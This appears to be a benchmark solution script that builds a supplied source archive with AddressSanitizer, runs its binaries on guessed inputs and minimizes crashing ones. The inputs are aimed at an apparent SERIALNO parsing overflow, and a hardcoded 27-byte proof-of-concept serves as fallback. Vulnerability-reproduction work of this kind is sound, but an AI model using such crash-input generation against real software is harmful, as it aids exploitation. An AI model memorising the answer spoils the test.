import os
import re
import io
import sys
import math
import stat
import time
import tarfile
import shutil
import tempfile
import subprocess
from pathlib import Path
from typing import List, Callable, Optional, Tuple


class Solution:
    def solve(self, src_path: str) -> bytes:
        fallback = b"S SERIALNO " + (b"A" * 16)  # 27 bytes

        t0 = time.time()
        time_budget = 55.0  # keep solve reasonably fast

        def timed_out() -> bool:
            return (time.time() - t0) > time_budget

        def safe_extract(tar: tarfile.TarFile, path: str) -> None:
            base = os.path.realpath(path)
            for member in tar.getmembers():
                member_path = os.path.realpath(os.path.join(path, member.name))
                if not (member_path == base or member_path.startswith(base + os.sep)):
                    continue
                tar.extract(member, path=path)

        def run_cmd(cmd: List[str], cwd: Path, env: dict, timeout: int) -> Tuple[int, str]:
            try:
                p = subprocess.run(
                    cmd,
                    cwd=str(cwd),
                    env=env,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    timeout=timeout,
                    check=False,
                )
                out = p.stdout.decode("utf-8", errors="replace")
                return p.returncode, out
            except subprocess.TimeoutExpired as e:
                out = ""
                if e.stdout:
                    out = e.stdout.decode("utf-8", errors="replace")
                return 124, out
            except Exception as e:
                return 127, str(e)

        def is_probable_crash(rc: int, out: str) -> bool:
            if rc < 0:
                return True
            if rc >= 128:
                return True
            low = out.lower()
            crash_markers = (
                "addresssanitizer",
                "undefinedbehaviorsanitizer",
                "asan:",
                "ubsan:",
                "stack-buffer-overflow",
                "heap-buffer-overflow",
                "global-buffer-overflow",
                "use-after-free",
                "segmentation fault",
                "sigsegv",
                "sigabrt",
                "abort",
                "core dumped",
                "fatal error",
            )
            return any(m in low for m in crash_markers)

        def find_root_dir(extract_dir: Path) -> Path:
            entries = [p for p in extract_dir.iterdir() if not p.name.startswith(".")]
            dirs = [p for p in entries if p.is_dir()]
            if len(dirs) == 1 and all((p.is_dir() or p.is_file()) for p in entries):
                return dirs[0]
            return extract_dir

        def make_env(base_env: Optional[dict] = None) -> dict:
            env = dict(os.environ if base_env is None else base_env)
            asan_flags = "-fsanitize=address -fno-omit-frame-pointer -O1 -g"
            env.setdefault("CFLAGS", asan_flags)
            env.setdefault("CXXFLAGS", asan_flags)
            env.setdefault("LDFLAGS", asan_flags)
            env.setdefault("ASAN_OPTIONS", "detect_leaks=0:allocator_may_return_null=1:abort_on_error=1")
            env.setdefault("UBSAN_OPTIONS", "halt_on_error=1:abort_on_error=1")
            return env

        def try_build(root: Path) -> bool:
            env = make_env()
            if (root / "build.sh").is_file():
                rc, _ = run_cmd(["bash", "build.sh"], root, env, timeout=180)
                return rc == 0
            if (root / "configure").is_file() and os.access(root / "configure", os.X_OK):
                rc, _ = run_cmd(["bash", "-lc", "./configure"], root, env, timeout=240)
                if rc != 0:
                    return False
                rc, _ = run_cmd(["bash", "-lc", "make -j8"], root, env, timeout=240)
                return rc == 0
            if (root / "CMakeLists.txt").is_file():
                build_dir = root / "build"
                build_dir.mkdir(exist_ok=True)
                rc, _ = run_cmd(["bash", "-lc", "cmake -S . -B build"], root, env, timeout=240)
                if rc != 0:
                    return False
                rc, _ = run_cmd(["bash", "-lc", "cmake --build build -j8"], root, env, timeout=240)
                return rc == 0
            if (root / "Makefile").is_file() or (root / "makefile").is_file():
                rc, _ = run_cmd(["bash", "-lc", "make -j8"], root, env, timeout=240)
                return rc == 0
            return False

        def list_executables(search_root: Path) -> List[Path]:
            exes = []
            for p in search_root.rglob("*"):
                if not p.is_file():
                    continue
                try:
                    st = p.stat()
                except Exception:
                    continue
                if (st.st_mode & stat.S_IXUSR) == 0:
                    continue
                try:
                    with p.open("rb") as f:
                        hdr = f.read(4)
                    if hdr != b"\x7fELF":
                        continue
                except Exception:
                    continue
                exes.append(p)
            def score(path: Path) -> Tuple[int, int, str]:
                name = path.name.lower()
                kw = 0
                for k in ("poc", "harness", "driver", "fuzz", "target", "run", "test"):
                    if k in name:
                        kw -= 5
                size = 0
                try:
                    size = path.stat().st_size
                except Exception:
                    size = 10**9
                return (kw, size, str(path))
            exes.sort(key=score)
            return exes

        def choose_runsh(root: Path) -> Optional[Path]:
            for cand in (root / "run.sh", root / "Run.sh", root / "RUN.sh"):
                if cand.is_file():
                    return cand
            found = []
            for p in root.rglob("run.sh"):
                if p.is_file():
                    found.append(p)
            if not found:
                return None
            found.sort(key=lambda x: (len(str(x)), str(x)))
            return found[0]

        def make_runners(root: Path) -> List[Callable[[bytes], Tuple[bool, int, str]]]:
            runners = []
            env = make_env()

            runsh = choose_runsh(root)
            if runsh is not None:
                def r_sh(data: bytes) -> Tuple[bool, int, str]:
                    if timed_out():
                        return (False, 124, "")
                    with tempfile.NamedTemporaryFile(delete=False) as tf:
                        tf.write(data)
                        tf.flush()
                        in_path = tf.name
                    try:
                        rc, out = run_cmd(["bash", str(runsh), in_path], runsh.parent, env, timeout=3)
                        return (is_probable_crash(rc, out), rc, out)
                    finally:
                        try:
                            os.unlink(in_path)
                        except Exception:
                            pass
                runners.append(r_sh)

            exes = list_executables(root)
            exes = exes[:15]  # limit
            for exe in exes:
                def make_exe_runner(exe_path: Path) -> Callable[[bytes], Tuple[bool, int, str]]:
                    def r_exe(data: bytes) -> Tuple[bool, int, str]:
                        if timed_out():
                            return (False, 124, "")
                        with tempfile.NamedTemporaryFile(delete=False) as tf:
                            tf.write(data)
                            tf.flush()
                            in_path = tf.name
                        try:
                            rc1, out1 = run_cmd([str(exe_path), in_path], exe_path.parent, env, timeout=3)
                            if is_probable_crash(rc1, out1):
                                return (True, rc1, out1)
                            try:
                                p = subprocess.run(
                                    [str(exe_path)],
                                    cwd=str(exe_path.parent),
                                    env=env,
                                    input=data,
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.STDOUT,
                                    timeout=3,
                                    check=False,
                                )
                                out2 = p.stdout.decode("utf-8", errors="replace")
                                rc2 = p.returncode
                                return (is_probable_crash(rc2, out2), rc2, out2)
                            except subprocess.TimeoutExpired as e:
                                out2 = ""
                                if e.stdout:
                                    out2 = e.stdout.decode("utf-8", errors="replace")
                                return (False, 124, out2)
                        finally:
                            try:
                                os.unlink(in_path)
                            except Exception:
                                pass
                    return r_exe
                runners.append(make_exe_runner(exe))
            return runners

        def scan_for_hints(root: Path) -> dict:
            hints = {"assuan": False, "sexp": False}
            exts = {".c", ".h", ".cpp", ".cc", ".txt", ".md", ".sh", ".in", ".am", ".ac", ".y", ".l"}
            patterns = [
                (re.compile(r"\bassuan_.*status\b", re.I), "assuan"),
                (re.compile(r"\bwrite_status\s*\(\s*\"SERIALNO\"", re.I), "assuan"),
                (re.compile(r"\bS\s+SERIALNO\b"), "assuan"),
                (re.compile(r"\bgcry_sexp_", re.I), "sexp"),
                (re.compile(r"\bsexp\b", re.I), "sexp"),
            ]
            for p in root.rglob("*"):
                if timed_out():
                    break
                if not p.is_file():
                    continue
                if p.suffix.lower() not in exts:
                    continue
                try:
                    if p.stat().st_size > 2_000_000:
                        continue
                    s = p.read_text(errors="ignore")
                except Exception:
                    continue
                if "serialno" not in s.lower() and "serial" not in s.lower():
                    continue
                for rx, key in patterns:
                    if rx.search(s):
                        hints[key] = True
            return hints

        def candidate_inputs(hints: dict) -> List[bytes]:
            ns = [8, 10, 12, 14, 15, 16, 17, 18, 20, 24, 28, 32, 40, 48, 64, 80, 96, 128, 192, 256]
            outs = []

            def add_unique(b: bytes):
                if b not in seen:
                    outs.append(b)
                    seen.add(b)

            seen = set()

            # Strong guess (matches 27 bytes with n=16)
            for n in [16, 17, 20, 24, 32]:
                add_unique(b"S SERIALNO " + (b"A" * n))
                add_unique(b"S SERIALNO " + (b"0" * n))
                add_unique(b"S SERIALNO " + (b"A" * n) + b"\n")
                add_unique(b"S SERIALNO " + (b"0" * n) + b"\n")

            # Generic assuan-like lines
            for n in ns:
                add_unique(b"SERIALNO " + (b"A" * n))
                add_unique(b"SERIALNO " + (b"0" * n))
                add_unique(b"SERIALNO " + (b"A" * n) + b"\n")
                add_unique(b"SERIALNO " + (b"0" * n) + b"\n")
                add_unique(b"serialno " + (b"A" * n) + b"\n")
                add_unique(b"serialno " + (b"0" * n) + b"\n")
                add_unique(b"SERIALNO:" + (b"A" * n) + b"\n")
                add_unique(b"SERIALNO:" + (b"0" * n) + b"\n")
                add_unique(b"S SERIALNO " + (b"A" * n) + b"\n")

            # Typical OpenPGP card serial prefix
            add_unique(b"D27600012401020000050000\n")
            add_unique(b"D27600012401020000050000")

            # S-expression variants (advanced)
            for n in [16, 20, 24, 32, 48, 64, 96, 128]:
                add_unique(b'(serialno "' + (b"A" * n) + b'")')
                add_unique(b'(serialno "' + (b"0" * n) + b'")')
                add_unique(b'(cardserialno "' + (b"A" * n) + b'")')
                add_unique(b'(cardserialno "' + (b"0" * n) + b'")')

            # Canonical sexp variants
            def canon_atom(name: bytes, data: bytes) -> bytes:
                return b"(" + str(len(name)).encode() + b":" + name + str(len(data)).encode() + b":" + data + b")"

            for n in [16, 20, 24, 32, 48, 64, 96, 128]:
                add_unique(canon_atom(b"serialno", b"A" * n))
                add_unique(canon_atom(b"serialno", b"0" * n))
                add_unique(canon_atom(b"cardserialno", b"A" * n))
                add_unique(canon_atom(b"cardserialno", b"0" * n))

            # Reorder based on hints
            if hints.get("assuan") and not hints.get("sexp"):
                return outs
            if hints.get("sexp") and not hints.get("assuan"):
                sexp_first = [b for b in outs if b.startswith(b"(")]
                other = [b for b in outs if not b.startswith(b"(")]
                return sexp_first + other
            return outs

        def find_existing_pocs(root: Path) -> List[bytes]:
            names = ("poc", "crash", "overflow", "serial", "seed")
            cands = []
            for p in root.rglob("*"):
                if timed_out():
                    break
                if not p.is_file():
                    continue
                nm = p.name.lower()
                if not any(k in nm for k in names):
                    continue
                try:
                    sz = p.stat().st_size
                    if 0 < sz <= 4096:
                        cands.append(p)
                except Exception:
                    continue
            cands.sort(key=lambda x: (x.stat().st_size if x.exists() else 9999999, len(str(x)), str(x)))
            outs = []
            for p in cands[:25]:
                try:
                    outs.append(p.read_bytes())
                except Exception:
                    pass
            return outs

        def minimize(data: bytes, crash_fn: Callable[[bytes], bool]) -> bytes:
            if not data:
                return data

            # Fast tail trimming
            changed = True
            while changed and len(data) > 0 and not timed_out():
                changed = False
                trial = data[:-1]
                if crash_fn(trial):
                    data = trial
                    changed = True

            # ddmin (delta debugging)
            def ddmin(d: bytes) -> bytes:
                n = 2
                while len(d) >= 2 and not timed_out():
                    chunk = int(math.ceil(len(d) / n))
                    reduced = False
                    for i in range(n):
                        start = i * chunk
                        end = min(len(d), (i + 1) * chunk)
                        if start >= len(d):
                            break
                        trial = d[:start] + d[end:]
                        if crash_fn(trial):
                            d = trial
                            n = max(2, n - 1)
                            reduced = True
                            break
                    if not reduced:
                        if n >= len(d):
                            break
                        n = min(len(d), n * 2)
                return d

            data2 = ddmin(data)

            # Tail trimming again
            while len(data2) > 0 and not timed_out():
                trial = data2[:-1]
                if crash_fn(trial):
                    data2 = trial
                else:
                    break

            return data2

        try:
            with tempfile.TemporaryDirectory() as td:
                extract_dir = Path(td)
                try:
                    with tarfile.open(src_path, "r:*") as tar:
                        safe_extract(tar, str(extract_dir))
                except Exception:
                    return fallback

                root = find_root_dir(extract_dir)

                # Optional build (best effort)
                try_build(root)

                runners = make_runners(root)
                if not runners:
                    return fallback

                hints = scan_for_hints(root)

                existing = find_existing_pocs(root)
                generated = candidate_inputs(hints)
                tests = existing + generated
                tests.append(fallback)

                best = None

                for runner in runners:
                    if timed_out():
                        break

                    def crashes(inp: bytes) -> bool:
                        ok, _, _ = runner(inp)
                        return ok

                    for data in tests:
                        if timed_out():
                            break
                        ok, _, _ = runner(data)
                        if not ok:
                            continue
                        minimized = minimize(data, crashes)
                        if not crashes(minimized):
                            minimized = data
                        if best is None or len(minimized) < len(best):
                            best = minimized
                            if len(best) <= 12:
                                return best
                        break  # next runner once found a crash

                if best is not None:
                    return best

                return fallback
        except Exception:
            return fallback